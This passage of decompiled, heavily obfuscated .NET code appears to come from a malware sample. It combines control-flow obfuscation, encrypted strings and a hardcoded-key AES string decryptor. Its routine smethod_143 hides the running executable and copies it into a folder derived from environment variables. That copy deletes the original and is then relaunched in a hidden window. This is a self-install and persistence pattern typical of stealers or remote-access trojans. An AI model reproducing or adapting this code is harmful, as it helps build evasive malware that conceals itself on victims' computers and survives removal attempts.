		return class22_0.int_1 >= 16384;
	}

	static string smethod_101()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return Class14.smethod_0(2673);
		}
	}

	static void smethod_102()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class33.smethod_99;
		}
		catch
		{
		}
	}

	static void smethod_103(Class15.Class21 class21_0)
	{
		class21_0.int_0 |= 12;
	}

	static void smethod_104(Class15.Class18 class18_0, int int_0, int int_1)
	{
		int num = (class18_0.int_1 += int_0);
		int num2 = 2;
		if (aoKmv57A4wSEkvDOgia())
		{
			int num3 = default(int);
			int num4 = default(int);
			while (true)
			{
				switch (num2)
				{
				default:
					num2 = 0;
					if (!XdRJXa7sy9ebEBASZRt())
					{
						continue;
					}
					goto case 2;
				case 2:
					if (num > 32768)
					{
						throw new InvalidOperationException();
					}
					num3 = (class18_0.int_0 - int_1) & 0x7FFF;
					num4 = 32768 - int_0;
					goto case 1;
				case 1:
				case 4:
					if (num3 > num4 || class18_0.int_0 >= num4)
					{
						Class33.smethod_18(class18_0, num3, int_0, int_1);
						return;
					}
					goto case 0;
				case 0:
					if (int_0 <= int_1)
					{
						Array.Copy(class18_0.byte_0, num3, class18_0.byte_0, class18_0.int_0, int_0);
						break;
					}
					while (int_0-- > 0)
					{
						class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[num3++];
					}
					return;
				case 3:
				case 5:
					break;
				case 6:
					return;
				}
				break;
			}
		}
		class18_0.int_0 += int_0;
	}

	static int smethod_105(int int_0, string string_0, Graphics graphics_0, Font font_0)
	{
		if (!XdRJXa7sy9ebEBASZRt())
		{
			switch (3)
			{
			case 0:
			case 3:
				break;
			case 1:
			case 4:
				goto IL_004b;
			case 2:
				goto IL_0059;
			default:
				goto IL_0068;
			case 6:
				goto IL_0084;
			}
		}
		Class42.Struct14 struct14_ = new Class42.Struct14(new Rectangle(0, 0, int_0, 10000));
		goto IL_004b;
		IL_0084:
		return struct14_.int_3 - struct14_.int_1;
		IL_0068:
		IntPtr hdc = default(IntPtr);
		int int_ = default(int);
		DrawText(hdc, string_0, -1, ref struct14_, int_);
		IntPtr intptr_ = default(IntPtr);
		SelectObject(hdc, intptr_);
		graphics_0.ReleaseHdc(hdc);
		goto IL_0084;
		IL_004b:
		int_ = 3088;
		hdc = graphics_0.GetHdc();
		goto IL_0059;
		IL_0059:
		IntPtr intptr_2 = font_0.ToHfont();
		intptr_ = SelectObject(hdc, intptr_2);
		goto IL_0068;
	}

	static bool smethod_106(Class15.Class16 class16_0)
	{
		int num = Class33.smethod_19(class16_0.class18_0);
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_01e7;
		}
		switch (6)
		{
		case 11:
			break;
		case 6:
			goto IL_00a3;
		case 5:
			goto IL_00e6;
		default:
			goto IL_0120;
		case 8:
			goto IL_0127;
		case 1:
			goto IL_0190;
		case 7:
			goto IL_01e7;
		case 2:
		case 3:
			goto IL_020f;
		case 4:
		case 9:
			goto IL_021d;
		case 12:
			goto IL_022d;
		case 0:
		{
			bool result = default(bool);
			return result;
		}
		}
		goto IL_005c;
		IL_0120:
		class16_0.int_4 = 8;
		goto IL_0127;
		IL_0190:
		int num2 = default(int);
		class16_0.int_5 = Class15.Class16.int_3[num2];
		goto IL_005c;
		IL_005c:
		if (class16_0.int_5 > 0)
		{
			class16_0.int_4 = 10;
			int num3 = Class33.smethod_81(class16_0.class17_0, class16_0.int_5);
			if (num3 < 0)
			{
				return false;
			}
			Class33.smethod_77(class16_0.class17_0, class16_0.int_5);
			class16_0.int_7 += num3;
		}
		Class33.smethod_104(class16_0.class18_0, class16_0.int_6, class16_0.int_7);
		goto IL_01e7;
		IL_0162:
		class16_0.int_4 = 9;
		goto IL_016a;
		IL_020f:
		class16_0.class19_0 = null;
		class16_0.int_4 = 2;
		goto IL_021d;
		IL_016a:
		num2 = Class33.smethod_17(class16_0.class19_1, class16_0.class17_0);
		if (num2 >= 0)
		{
			class16_0.int_7 = Class15.Class16.int_2[num2];
			goto IL_0190;
		}
		return false;
		IL_01e7:
		num -= class16_0.int_6;
		class16_0.int_4 = 7;
		goto IL_00a3;
		IL_00a3:
		while (num >= 258)
		{
			switch (class16_0.int_4)
			{
			case 10:
				break;
			default:
				continue;
			case 7:
				goto IL_00cb;
			case 8:
				goto IL_0117;
			case 9:
				goto IL_016a;
			}
			goto IL_005c;
		}
		goto IL_022d;
		IL_022d:
		return true;
		IL_021d:
		return true;
		IL_00cb:
		while (((num2 = Class33.smethod_17(class16_0.class19_0, class16_0.class17_0)) & -256) == 0)
		{
			Class33.smethod_33(class16_0.class18_0, num2);
			if (--num < 258)
			{
				return true;
			}
		}
		goto IL_00e6;
		IL_00e6:
		if (num2 >= 257)
		{
			class16_0.int_6 = Class15.Class16.int_0[num2 - 257];
			class16_0.int_5 = Class15.Class16.int_1[num2 - 257];
			goto IL_0117;
		}
		if (num2 < 0)
		{
			return false;
		}
		class16_0.class19_1 = null;
		goto IL_020f;
		IL_0127:
		int num4 = Class33.smethod_81(class16_0.class17_0, class16_0.int_5);
		if (num4 >= 0)
		{
			Class33.smethod_77(class16_0.class17_0, class16_0.int_5);
			class16_0.int_6 += num4;
			goto IL_0162;
		}
		return false;
		IL_0117:
		if (class16_0.int_5 > 0)
		{
			goto IL_0120;
		}
		goto IL_0162;
	}

	static void smethod_107(int int_0, byte[] byte_0, Class15.Class25 class25_0, int int_1)
	{
		Array.Copy(byte_0, int_1, class25_0.byte_0, class25_0.int_1, int_0);
		class25_0.int_1 += int_0;
	}

	static void smethod_108(Class15.Class22.Class23 class23_0, int int_0)
	{
		Class33.smethod_144(class23_0.class22_0.class25_0, class23_0.short_1[int_0] & 0xFFFF, (int)class23_0.byte_0[int_0]);
	}

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_109(Class15.Class22 class22_0)
	{
		class22_0.int_1 = 0;
		class22_0.int_2 = 0;
	}

	static void smethod_110(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class33.smethod_73(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_111(Class15.Class22 class22_0, int int_0)
	{
		Class33.smethod_123(class22_0.class23_2);
		int num = default(int);
		while (true)
		{
			Class33.smethod_123(class22_0.class23_0);
			Class33.smethod_123(class22_0.class23_1);
			if (aoKmv57A4wSEkvDOgia())
			{
				switch (4)
				{
				case 0:
				case 5:
					break;
				case 1:
				case 4:
					Class33.smethod_144(class22_0.class25_0, class22_0.class23_0.int_1 - 257, 5);
					Class33.smethod_144(class22_0.class25_0, class22_0.class23_1.int_1 - 1, 5);
					Class33.smethod_144(class22_0.class25_0, int_0 - 4, 4);
					num = 0;
					goto IL_009a;
				default:
					num++;
					goto IL_009a;
				case 2:
					goto IL_00c3;
				case 6:
					goto end_IL_000b;
					IL_009a:
					if (num < int_0)
					{
						Class33.smethod_144(class22_0.class25_0, (int)class22_0.class23_2.byte_0[Class15.Class22.int_0[num]], 3);
						goto default;
					}
					goto IL_00c3;
				}
				continue;
			}
			goto IL_00c3;
			IL_00c3:
			Class33.smethod_155(class22_0.class23_0, class22_0.class23_2);
			break;
			continue;
			end_IL_000b:
			break;
		}
		Class33.smethod_155(class22_0.class23_1, class22_0.class23_2);
	}

	static Bitmap smethod_112(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class14.smethod_0(3356) + string_0 + Class14.smethod_0(3417));
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_113(Class28 class28_0, Enum1 enum1_0, string string_0)
	{
		Class33.smethod_59(class28_0, enum1_0, string_0, string.Empty);
	}

	static void smethod_114(Class15.Class24 class24_0)
	{
		class24_0.int_0 = (class24_0.byte_0[class24_0.int_4] << 5) ^ class24_0.byte_0[class24_0.int_4 + 1];
	}

	static bool smethod_115(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class29_0.method_7();
	}

	static void smethod_116(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class33.smethod_73(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_117(Class15.Stream0 stream0_0, int int_0)
	{
		Class33.smethod_89(int_0, stream0_0);
		Class33.smethod_89(int_0 >> 16, stream0_0);
	}

	static void smethod_118(byte[] byte_0, Class15.Class22.Class23 class23_0, short[] short_0)
	{
		class23_0.short_1 = short_0;
		class23_0.byte_0 = byte_0;
	}

	static string smethod_119(string string_0)
	{
		if (string_0.StartsWith(Class14.smethod_0(3426)) && string_0.EndsWith(Class14.smethod_0(3447)))
		{
			return Class14.smethod_0(3468);
		}
		return string_0;
	}

	static int smethod_120(Class15.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_121(Class39 class39_0)
	{
		if (class39_0 != null)
		{
			Class39.class39_0 = class39_0;
			AppDomain.CurrentDomain.UnhandledException += class39_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class39_0.method_0);
		}
	}

	static int smethod_122(Class15.Class22.Class23 class23_0)
	{
		int num = 0;
		for (int i = 0; i < class23_0.short_0.Length; i++)
		{
			num += class23_0.short_0[i] * class23_0.byte_0[i];
		}
		return num;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_123(Class15.Class22.Class23 class23_0)
	{
		int[] array = new int[class23_0.int_3];
		int num = 0;
		class23_0.short_1 = new short[class23_0.short_0.Length];
		for (int i = 0; i < class23_0.int_3; i++)
		{
			array[i] = num;
			num += class23_0.int_2[i] << 15 - i;
		}
		for (int j = 0; j < class23_0.int_1; j++)
		{
			int num2 = class23_0.byte_0[j];
			if (num2 > 0)
			{
				class23_0.short_1[j] = Class33.smethod_139(array[num2 - 1]);
				array[num2 - 1] += 1 << 16 - num2;
			}
		}
	}

	static void smethod_124(Control0 control0_0, string string_0)
	{
		while (true)
		{
			control0_0.string_0 = string_0;
			while (true)
			{
				control0_0.timer_0.set_Enabled(false);
				if (!aoKmv57A4wSEkvDOgia())
				{
					break;
				}
				switch (5)
				{
				case 1:
				case 3:
					continue;
				case 0:
					break;
				case 2:
				case 5:
					control0_0.image_0 = (Image)(object)Class33.smethod_112((string_0.Length > 0) ? Class14.smethod_0(3546) : Class14.smethod_0(3541));
					control0_0.bool_1 = true;
					control0_0.bool_0 = true;
					goto default;
				default:
					if (string_0.Length > 0)
					{
						((Control)control0_0).set_Height(100);
					}
					((Control)control0_0).Refresh();
					return;
				case 6:
					return;
				}
				break;
			}
		}
	}

	static object smethod_125(Class34 class34_0)
	{
		return class34_0.object_0;
	}

	static void smethod_126(Class29 class29_0)
	{
		class29_0.eventHandler_0?.Invoke(class29_0, EventArgs.Empty);
	}

	static void smethod_127(Class15.Class17 class17_0)
	{
		class17_0.uint_0 >>= class17_0.int_2 & 7;
		class17_0.int_2 &= -8;
	}

	static bool smethod_128(int int_0, Class15.Class24 class24_0)
	{
		int num = 128;
		int num2 = 128;
		short[] short_ = class24_0.short_1;
		int int_ = class24_0.int_4;
		int num3 = class24_0.int_4 + class24_0.int_2;
		int num4 = Math.Max(class24_0.int_2, 2);
		int num5 = Math.Max(class24_0.int_4 - 32506, 0);
		int num6 = class24_0.int_4 + 258 - 1;
		byte b = class24_0.byte_0[num3 - 1];
		byte b2 = class24_0.byte_0[num3];
		if (num4 >= 8)
		{
			num >>= 2;
		}
		if (num2 > class24_0.int_5)
		{
			num2 = class24_0.int_5;
		}
		do
		{
			if (class24_0.byte_0[int_0 + num4] != b2 || class24_0.byte_0[int_0 + num4 - 1] != b || class24_0.byte_0[int_0] != class24_0.byte_0[int_] || class24_0.byte_0[int_0 + 1] != class24_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num7 = int_0 + 2;
			int_ += 2;
			while (class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && class24_0.byte_0[++int_] == class24_0.byte_0[++num7] && int_ < num6)
			{
			}
			if (int_ > num3)
			{
				class24_0.int_1 = int_0;
				num3 = int_;
				num4 = int_ - class24_0.int_4;
				if (num4 >= num2)
				{
					break;
				}
				b = class24_0.byte_0[num3 - 1];
				b2 = class24_0.byte_0[num3];
			}
			int_ = class24_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num5 && --num != 0);
		class24_0.int_2 = Math.Min(num4, class24_0.int_5);
		return class24_0.int_2 >= 3;
	}

	static bool smethod_129(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(Class14.smethod_0(2893));
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	static bool smethod_130(Class15.Class24 class24_0)
	{
		return class24_0.int_8 == class24_0.int_7;
	}

	static void smethod_131(EventArgs0 eventArgs0_0, Class29 class29_0)
	{
		class29_0.delegate10_0?.Invoke(class29_0, eventArgs0_0);
	}

	static void smethod_132(Form1 form1_0)
	{
		while (true)
		{
			((Control)form1_0).SuspendLayout();
			while (true)
			{
				((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
				((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
				((Control)form1_0.button_1).set_Size(new Size(100, 24));
				if (!XdRJXa7sy9ebEBASZRt())
				{
					switch (0)
					{
					case 9:
						continue;
					case 7:
						break;
					case 0:
						((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
						((Control)form1_0.button_1).set_TabIndex(0);
						((Control)form1_0.button_1).set_Text(Class14.smethod_0(3555));
						((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
						((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
						((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
						goto case 1;
					case 1:
					case 3:
						((Control)form1_0.button_0).set_Size(new Size(100, 24));
						((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
						((Control)form1_0.button_0).set_TabIndex(1);
						((Control)form1_0.button_0).set_Text(Class14.smethod_0(3564));
						((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
						((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
						((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
						goto case 4;
					case 4:
						form1_0.control1_0.IconState = Enum2.const_2;
						((Control)form1_0.class38_0).set_Anchor((AnchorStyles)13);
						((Control)form1_0.class38_0).set_Location(new Point(20, 72));
						((Control)form1_0.class38_0).set_Size(new Size(382, 13));
						((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
						goto default;
					default:
						((Form)form1_0).set_ClientSize(new Size(418, 224));
						((Form)form1_0).set_ControlBox(false);
						goto case 6;
					case 6:
					case 8:
						((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
						{
							form1_0.control2_0,
							(Control)form1_0.button_0,
							(Control)form1_0.button_1,
							form1_0.control1_0,
							(Control)form1_0.class38_0
						});
						((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
						((Form)form1_0).set_MaximizeBox(false);
						((Form)form1_0).set_MinimizeBox(false);
						goto case 10;
					case 10:
						((Form)form1_0).set_ShowInTaskbar(false);
						((Form)form1_0).set_StartPosition((FormStartPosition)1);
						goto case 5;
					case 5:
						((Control)form1_0).ResumeLayout(false);
						return;
					case 11:
						return;
					}
					break;
				}
				return;
			}
		}
	}

	static void smethod_133(Class15.Class17 class17_0)
	{
		int num = 0;
		class17_0.int_2 = 0;
		int num2 = 0;
		class17_0.int_1 = 0;
		int num3 = 0;
		class17_0.int_0 = 0;
		class17_0.uint_0 = 0u;
	}

	static Icon smethod_134()
	{
		while (true)
		{
			int int_ = 0;
			while (true)
			{
				int int_2 = 0;
				if (aoKmv57A4wSEkvDOgia())
				{
					switch (0)
					{
					case 1:
						break;
					case 5:
						goto end_IL_0003;
					case 0:
					case 2:
						goto IL_003b;
					default:
						goto IL_0061;
					case 6:
						goto IL_0066;
					}
					continue;
				}
				goto IL_0061;
				IL_0064:
				return null;
				IL_003b:
				int num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
				if (num > 0)
				{
					ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
					goto IL_0061;
				}
				goto IL_0064;
				IL_0066:
				return Icon.FromHandle(new IntPtr(int_));
				IL_0061:
				if (int_ == 0)
				{
					goto IL_0064;
				}
				goto IL_0066;
				continue;
				end_IL_0003:
				break;
			}
		}
	}

	[DllImport("kernel32.dll")]
	internal static extern void GetSystemInfo(ref Class42.Struct16 struct16_0);

	static void smethod_135(string string_0, string string_1, string string_2, byte[] byte_0, Class41 class41_0, Delegate12 delegate12_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class41_0.string_2);
			if (class41_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class41_0.iwebProxy_0);
			}
			delegate12_0(reportingService.UploadReport2(class41_0.string_1, byte_0, string_0, string_2, string_1));
		}
		catch (Exception ex)
		{
			delegate12_0(Class14.smethod_0(3577) + ex.Message);
		}
	}

	static int smethod_136(Class29 class29_0, string string_0)
	{
		try
		{
			bool flag = class29_0.char_0[0] == '\u0001';
			char c = default(char);
			bool flag2 = default(bool);
			int i = default(int);
			int result = default(int);
			while (string_0 != null)
			{
				while (string_0.Length != 0 && (!flag || string_0.Length <= 4))
				{
					while (flag || string_0[0] == '#')
					{
						int num = 0;
						while (true)
						{
							int num2 = string_0.Length - 1;
							while (true)
							{
								if (num2 >= 0)
								{
									if (!flag && num2 == 0)
									{
										goto IL_0107;
									}
									c = string_0[num2];
									flag2 = false;
									i = 0;
								}
								else
								{
									if (!aoKmv57A4wSEkvDOgia())
									{
										break;
									}
									switch (9)
									{
									case 1:
										goto IL_007d;
									case 3:
									case 7:
										goto end_IL_00c6;
									case 5:
										goto end_IL_00d1;
									case 4:
										goto IL_00f5;
									case 0:
									case 8:
										goto IL_0102;
									case 9:
										goto IL_0107;
									case 2:
										return result;
									}
								}
								for (; i < class29_0.char_0.Length; i++)
								{
									if (class29_0.char_0[i] == c)
									{
										num = num * class29_0.char_0.Length + i;
										flag2 = true;
										break;
									}
								}
								goto IL_007d;
								IL_007d:
								if (flag2)
								{
									num2--;
									continue;
								}
								return -1;
								IL_0107:
								return num;
								continue;
								end_IL_00c6:
								break;
							}
							continue;
							end_IL_00d1:
							break;
						}
					}
					break;
					IL_00f5:;
				}
				break;
				IL_0102:;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static Class15.Class19 smethod_137(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_4];
		if (aoKmv57A4wSEkvDOgia())
		{
			switch (2)
			{
			case 0:
			case 2:
				break;
			default:
				goto IL_004b;
			}
		}
		Array.Copy(class20_0.byte_1, class20_0.int_3, array, 0, class20_0.int_4);
		goto IL_004b;
		IL_004b:
		return new Class15.Class19(array);
	}

	static bool smethod_138(bool bool_0, string string_0, string string_1, byte[] byte_0)
	{
		int num = 1;
		bool result = default(bool);
		do
		{
			if (!Class33.smethod_158(string_0, string_1, byte_0, bool_0))
			{
				num = checked(num + 1);
				continue;
			}
			if (aoKmv57A4wSEkvDOgia())
			{
				switch (3)
				{
				case 0:
				case 3:
					break;
				case 4:
					goto end_IL_000c;
				default:
					return result;
				}
			}
			return true;
			continue;
			end_IL_000c:
			break;
		}
		while (num <= 5);
		return false;
	}

	static short smethod_139(int int_0)
	{
		return (short)((Class15.Class22.byte_0[int_0 & 0xF] << 12) | (Class15.Class22.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class15.Class22.byte_0[(int_0 >> 8) & 0xF] << 4) | Class15.Class22.byte_0[int_0 >> 12]);
	}

	static string smethod_140(string string_0)
	{
		string password = Class14.smethod_0(3594);
		byte[] bytes = default(byte[]);
		int num2 = default(int);
		byte[] bytes3 = default(byte[]);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] array2 = default(byte[]);
		int count = default(int);
		string result = default(string);
		while (true)
		{
			string s = Class14.smethod_0(3643);
			string text = Class14.smethod_0(3672);
			while (true)
			{
				int iterations = 2;
				int num = 0;
				if (!aoKmv57A4wSEkvDOgia())
				{
					goto IL_000d;
				}
				goto IL_0048;
				IL_0048:
				switch (num)
				{
				case 0:
				case 2:
					break;
				default:
					goto IL_002e;
				case 4:
					continue;
				case 6:
					goto end_IL_0074;
				case 7:
				{
					byte[] array = Convert.FromBase64String(string_0);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes, iterations);
					byte[] bytes2 = rfc2898DeriveBytes.GetBytes(num2 / 8);
					RijndaelManaged rijndaelManaged = new RijndaelManaged();
					rijndaelManaged.Mode = CipherMode.CBC;
					ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes2, bytes3);
					MemoryStream memoryStream = new MemoryStream(array);
					cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
					array2 = new byte[checked(array.Length - 1 + 1)];
					count = cryptoStream.Read(array2, 0, array2.Length);
					memoryStream.Close();
					goto case 3;
				}
				case 3:
				case 5:
					cryptoStream.Close();
					return Encoding.UTF8.GetString(array2, 0, count);
				case 8:
					return result;
				}
				goto IL_000d;
				IL_000d:
				string s2 = Class14.smethod_0(3681);
				num2 = 256;
				bytes3 = Encoding.ASCII.GetBytes(s2);
				goto IL_002e;
				IL_002e:
				bytes = Encoding.ASCII.GetBytes(s);
				num = 7;
				if (!aoKmv57A4wSEkvDOgia())
				{
					continue;
				}
				goto IL_0048;
				continue;
				end_IL_0074:
				break;
			}
		}
	}

	static void smethod_141(Form0 form0_0, ThreadStart threadStart_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static byte[] smethod_142(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class33.smethod_54(byte_2, byte_1, 2, byte_0);
	}

	static void smethod_143()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		object obj = default(object);
		int num5 = default(int);
		UnicodeEncoding encoding = default(UnicodeEncoding);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 970:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_009b;
						case 6:
							goto IL_00a4;
						case 8:
						case 9:
							goto IL_00ca;
						case 10:
							goto IL_00d9;
						case 11:
							goto IL_00f3;
						case 12:
							goto IL_0165;
						case 14:
							goto IL_018c;
						case 15:
							goto IL_019a;
						case 16:
							goto IL_01b4;
						case 13:
						case 17:
							goto IL_01c6;
						case 18:
						case 19:
							goto IL_01cf;
						case 20:
							goto IL_01dd;
						case 21:
							goto IL_01f2;
						case 22:
							goto IL_020a;
						case 24:
							goto IL_0228;
						case 25:
							goto IL_022c;
						case 26:
							goto IL_0237;
						case 27:
							goto IL_0255;
						case 28:
							goto IL_0265;
						case 29:
							goto IL_0275;
						case 30:
							goto IL_0285;
						case 31:
							goto IL_02bc;
						case 32:
							goto IL_02cc;
						case 33:
							goto IL_02dc;
						case 34:
							goto IL_02ec;
						case 35:
							goto IL_02f7;
						case 23:
						case 36:
						case 37:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 38:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_02f7:
					num = 35;
					Interaction.Shell(text + Class14.smethod_0(631), (AppWinStyle)2, false, -1);
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_0034;
					IL_0034:
					num = 3;
					text3 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class14.smethod_0(2080);
					goto IL_005b;
					IL_005b:
					num = 4;
					text = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385)) + Class14.smethod_0(257);
					goto IL_009b;
					IL_009b:
					num = 5;
					executablePath = Application.get_ExecutablePath();
					goto IL_00a4;
					IL_00a4:
					num = 6;
					if (Operators.CompareString(Application.get_ExecutablePath(), text + Class14.smethod_0(512), false) == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_00ca;
					IL_00ca:
					num = 9;
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
					goto IL_00d9;
					IL_00d9:
					num = 10;
					Directory.CreateDirectory(text + Class14.smethod_0(2089));
					goto IL_00f3;
					IL_00f3:
					num = 11;
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(text + Class14.smethod_0(631)), false), Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291)) + Class33.smethod_140(Class14.smethod_0(525)) + Class14.smethod_0(614)), false))))
					{
						goto IL_0165;
					}
					goto IL_0228;
					IL_0165:
					num = 12;
					obj = ((ServerComputer)Class2.Computer).get_FileSystem().ReadAllText(text + Class14.smethod_0(3710));
					goto IL_01c6;
					IL_01c6:
					num = 13;
					num5 = 1;
					goto IL_018c;
					IL_018c:
					num = 14;
					Thread.Sleep(1000);
					goto IL_019a;
					IL_019a:
					num = 15;
					((ServerComputer)Class2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
					goto IL_01b4;
					IL_01b4:
					num = 16;
					if (File.Exists(Conversions.ToString(obj)))
					{
						goto IL_01c6;
					}
					goto IL_01cf;
					IL_01cf:
					num = 19;
					Thread.Sleep(1500);
					goto IL_01dd;
					IL_01dd:
					num = 20;
					File.SetAttributes(Conversions.ToString(obj), FileAttributes.Normal);
					goto IL_01f2;
					IL_01f2:
					num = 21;
					File.SetAttributes(Class14.smethod_0(3735), FileAttributes.Normal);
					goto IL_020a;
					IL_020a:
					num = 22;
					File.Delete(text + Class14.smethod_0(3710));
					break;
					IL_0228:
					num = 24;
					goto IL_022c;
					IL_022c:
					num = 25;
					encoding = new UnicodeEncoding();
					goto IL_0237;
					IL_0237:
					num = 26;
					streamWriter = new StreamWriter(text + Class14.smethod_0(3710), append: true, encoding);
					goto IL_0255;
					IL_0255:
					num = 27;
					Conversion.Int((object)false);
					goto IL_0265;
					IL_0265:
					num = 28;
					Conversion.Int((object)false);
					goto IL_0275;
					IL_0275:
					num = 29;
					Conversion.Int((object)false);
					goto IL_0285;
					IL_0285:
					num = 30;
					File.Copy(Class14.smethod_0(257) + Application.get_ExecutablePath() + Class14.smethod_0(257), text + Class14.smethod_0(631));
					goto IL_02bc;
					IL_02bc:
					num = 31;
					Conversion.Int((object)false);
					goto IL_02cc;
					IL_02cc:
					num = 32;
					Conversion.Int((object)false);
					goto IL_02dc;
					IL_02dc:
					num = 33;
					streamWriter.Write(Application.get_ExecutablePath());
					goto IL_02ec;
					IL_02ec:
					num = 34;
					streamWriter.Dispose();
					goto IL_02f7;
					end_IL_0000_2:
					break;
				}
				num = 37;
				num5 = 2;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2, num5);
				try0000_dispatch = 970;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_144(Class15.Class25 class25_0, int int_0, int int_1)
	{
		class25_0.uint_0 |= (uint)(int_0 << class25_0.int_2);
		int num = 3;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0094;
		}
		goto IL_00ac;
		IL_00ac:
		while (true)
		{
			switch (num)
			{
			case 0:
			case 2:
				break;
			case 3:
				goto IL_0086;
			case 1:
			case 4:
				goto IL_0094;
			default:
				num = 0;
				if (!XdRJXa7sy9ebEBASZRt())
				{
				}
				continue;
			case 5:
				class25_0.int_2 -= 16;
				return;
			}
			break;
		}
		goto IL_002a;
		IL_0086:
		class25_0.int_2 += int_1;
		goto IL_0094;
		IL_0094:
		if (class25_0.int_2 >= 16)
		{
			goto IL_002a;
		}
		return;
		IL_002a:
		class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
